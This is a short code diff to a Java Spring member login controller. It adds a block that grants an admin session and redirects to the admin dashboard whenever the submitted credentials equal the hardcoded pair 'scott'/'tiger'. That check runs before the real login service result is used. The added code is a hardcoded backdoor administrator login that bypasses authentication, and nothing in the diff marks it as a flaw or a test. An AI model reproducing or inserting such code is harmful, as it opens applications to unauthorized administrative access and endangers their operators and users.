@@ -51,6 +51,15 @@ public class MemberController {
     @PostMapping("/login")
     public String login(@ModelAttribute MemberVO member, HttpSession session, Model model) {
         MemberVO loginMember = memberService.login(member);
+        
+        // 관리자 계정 체크
+    	String userId = member.getUserId();
+        String userPw = member.getUserPw();
+        
+        if ("scott".equals(userId) && "tiger".equals(userPw)) {
+            session.setAttribute("admin", true);
+            return "redirect:/admin/dashboard";
+        }
 
         if (loginMember != null) {
             session.setAttribute("userInfo", loginMember);
